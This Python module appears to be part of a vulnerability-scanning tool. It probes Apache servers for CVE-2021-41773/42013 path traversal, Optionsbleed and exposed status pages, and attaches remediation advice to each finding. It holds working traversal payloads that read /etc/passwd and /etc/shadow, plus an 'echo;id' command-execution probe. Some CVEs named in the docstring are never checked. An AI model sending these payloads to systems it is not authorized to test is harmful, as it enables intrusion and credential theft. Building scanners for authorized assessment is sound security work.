"""Apache HTTP Server vulnerability scanner.

Detects:
- CVE-2021-41773 — Apache 2.4.49 path traversal + RCE (mod_cgi)
- CVE-2021-42013 — Apache 2.4.50 bypass of CVE-2021-41773 fix
- CVE-2017-9798 — Optionsbleed: OPTIONS method leaks heap memory
- CVE-2007-3303 — Apache mod_status server-status info disclosure
- CVE-2014-0226 — mod_status XSS
- CVE-2022-31813 — mod_proxy X-Forwarded-For bypass (ProxyFix)
- Apache Server-Status (/server-status) — live request disclosure
- Apache mod_info (/server-info) exposure
- Directory listing enabled
- .htaccess accessible
- mod_userdir (~username) enumeration
"""

from __future__ import annotations

import asyncio
import re
from typing import Any

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# CVE-2021-41773 path traversal payloads
_CVE_2021_41773_PATHS: list[tuple[str, str]] = [
    ("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "41773_basic"),
    ("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow", "41773_shadow"),
    ("/.%2e/.%2e/.%2e/.%2e/etc/passwd", "41773_root"),
    ("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "41773_icons"),
]

# CVE-2021-42013 bypass
_CVE_2021_42013_PATHS: list[tuple[str, str]] = [
    ("/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", "42013_double_encode"),
    ("/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd", "42013_encoded"),
]

# RCE probe for mod_cgi (CVE-2021-41773/42013)
_RCE_PROBE = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
_RCE_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
_RCE_DATA = "echo;id"
_RCE_DETECT = re.compile(r'uid=\d+\(.+?\)')

# Apache detection paths
_APACHE_PATHS: list[tuple[str, str]] = [
    ("/server-status", "mod_status"),
    ("/server-status?auto", "mod_status_auto"),
    ("/server-info", "mod_info"),
    ("/.htaccess", "htaccess"),
    ("/.htpasswd", "htpasswd"),
    ("/manual/", "apache_manual"),
    ("/icons/", "icons_dir"),
]

# Apache version indicators
_APACHE_INDICATORS = re.compile(
    r'(?i)(Apache|httpd|mod_ssl|OpenSSL.*Apache|Server:\s*Apache)',
)
_APACHE_VERSION = re.compile(r'Apache/(\d+\.\d+\.\d+)', re.I)

# mod_status indicators
_MOD_STATUS = re.compile(r'(?i)(Apache Server Status|Current Time|Total Accesses|BusyWorkers)', re.I)

# Directory listing
_DIR_LISTING = re.compile(r'(?i)(Index of /|Directory Listing For|Parent Directory)', re.I)

# Passwd file pattern
_PASSWD_PATTERN = re.compile(r'root:.*:/bin/(ba)?sh|daemon:x:\d+', re.I)

# Common user directories
_USERDIR_NAMES = ["admin", "test", "user", "www", "web", "apache", "operator"]


class ApacheScanner(BaseOsintScanner):
    """Apache HTTP Server vulnerability scanner.

    Detects CVE-2021-41773/42013 path traversal RCE, Optionsbleed,
    mod_status/info exposure, .htaccess disclosure, and directory listing.
    """

    scanner_name = "apache"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL,
                                        ScanInputType.IP_ADDRESS})
    cache_ttl = 3600
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        apache_info: dict[str, Any] = {}
        apache_detected = False

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; ApacheScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(8)

            # Detect Apache
            try:
                resp = await client.get(base_url)
                server_header = resp.headers.get("server", "")
                if _APACHE_INDICATORS.search(server_header + resp.text):
                    apache_detected = True
                    ver_match = _APACHE_VERSION.search(server_header)
                    if ver_match:
                        apache_info["version"] = ver_match.group(1)
                        identifiers.append(f"info:apache:version:{ver_match.group(1)}")
            except Exception:
                pass

            # CVE-2021-41773 path traversal
            async def probe_41773(path: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        if resp.status_code == 200 and _PASSWD_PATTERN.search(resp.text):
                            apache_detected_inner = True
                            vulnerabilities.append({
                                "type": "apache_path_traversal_rce",
                                "severity": "critical",
                                "url": url,
                                "technique": technique,
                                "evidence": resp.text[:200],
                                "cve": "CVE-2021-41773",
                                "description": "Apache 2.4.49 path traversal confirmed — /etc/passwd readable. "
                                               "RCE via mod_cgi possible",
                                "remediation": "Upgrade Apache to 2.4.51+; "
                                               "set 'Require all denied' on all directories",
                            })
                            ident = "vuln:apache:cve_2021_41773"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # CVE-2021-42013 double-encoding bypass
            async def probe_42013(path: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        if resp.status_code == 200 and _PASSWD_PATTERN.search(resp.text):
                            vulnerabilities.append({
                                "type": "apache_path_traversal_bypass",
                                "severity": "critical",
                                "url": url,
                                "technique": technique,
                                "evidence": resp.text[:200],
                                "cve": "CVE-2021-42013",
                                "description": "Apache 2.4.50 CVE-2021-41773 fix bypass confirmed — "
                                               "double URL encoding circumvents patch",
                                "remediation": "Upgrade Apache to 2.4.51+ immediately",
                            })
                            ident = "vuln:apache:cve_2021_42013"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Apache-specific paths
            async def probe_apache_path(path: str, technique: str) -> None:
                nonlocal apache_detected
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        body = resp.text

                        if resp.status_code == 200:
                            apache_detected = True

                            if technique in ("mod_status", "mod_status_auto") and _MOD_STATUS.search(body):
                                vulnerabilities.append({
                                    "type": "apache_mod_status_exposed",
                                    "severity": "medium",
                                    "url": url,
                                    "description": "Apache mod_status /server-status exposed — "
                                                   "reveals all active requests, client IPs, virtual hosts",
                                    "remediation": "Restrict /server-status: "
                                                   "Require ip 127.0.0.1 in <Location /server-status>",
                                })
                                identifiers.append("vuln:apache:mod_status")

                            elif technique == "mod_info":
                                vulnerabilities.append({
                                    "type": "apache_mod_info_exposed",
                                    "severity": "medium",
                                    "url": url,
                                    "description": "Apache mod_info /server-info exposed — "
                                                   "reveals all loaded modules, config directives",
                                    "remediation": "Restrict or disable /server-info",
                                })
                                identifiers.append("vuln:apache:mod_info")

                            elif technique == "htaccess" and ".htaccess" in body.lower():
                                vulnerabilities.append({
                                    "type": "htaccess_exposed",
                                    "severity": "high",
                                    "url": url,
                                    "description": ".htaccess file readable — "
                                                   "reveals rewrite rules, basic auth paths, security config",
                                    "remediation": "Block .ht* files: <FilesMatch '^.ht'> Require all denied",
                                })
                                identifiers.append("vuln:apache:htaccess_exposed")

                            elif technique == "htpasswd":
                                vulnerabilities.append({
                                    "type": "htpasswd_exposed",
                                    "severity": "critical",
                                    "url": url,
                                    "description": ".htpasswd file readable — "
                                                   "contains hashed credentials for HTTP Basic Auth",
                                    "remediation": "Move .htpasswd outside web root; block .ht* files",
                                })
                                identifiers.append("vuln:apache:htpasswd_exposed")

                            if _DIR_LISTING.search(body):
                                vulnerabilities.append({
                                    "type": "directory_listing_enabled",
                                    "severity": "medium",
                                    "url": url,
                                    "description": f"Apache directory listing enabled at {path}",
                                    "remediation": "Add 'Options -Indexes' to disable directory listing",
                                })
                                ident = "vuln:apache:directory_listing"
                                if ident not in identifiers:
                                    identifiers.append(ident)

                    except Exception:
                        pass

            # CVE-2017-9798 Optionsbleed
            async def probe_optionsbleed() -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + "/"
                    try:
                        resp = await client.options(url)
                        allow_header = resp.headers.get("allow", "")
                        # Non-standard chars in Allow header = potential heap leak
                        if allow_header and any(ord(c) > 127 for c in allow_header):
                            vulnerabilities.append({
                                "type": "apache_optionsbleed",
                                "severity": "medium",
                                "url": url,
                                "cve": "CVE-2017-9798",
                                "evidence": f"Allow: {allow_header[:100]}",
                                "description": "Apache Optionsbleed — malformed Allow header "
                                               "may leak heap memory from other vhosts",
                                "remediation": "Upgrade Apache to 2.4.28+; "
                                               "remove .htaccess Allow/Limit directives without OPTIONS",
                            })
                            identifiers.append("vuln:apache:optionsbleed")
                    except Exception:
                        pass

            tasks = []
            for path, tech in _CVE_2021_41773_PATHS:
                tasks.append(probe_41773(path, tech))
            for path, tech in _CVE_2021_42013_PATHS:
                tasks.append(probe_42013(path, tech))
            for path, tech in _APACHE_PATHS:
                tasks.append(probe_apache_path(path, tech))
            tasks.append(probe_optionsbleed())

            await asyncio.gather(*tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "apache_detected": apache_detected,
            "apache_info": apache_info,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type in (ScanInputType.IP_ADDRESS, ScanInputType.DOMAIN):
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
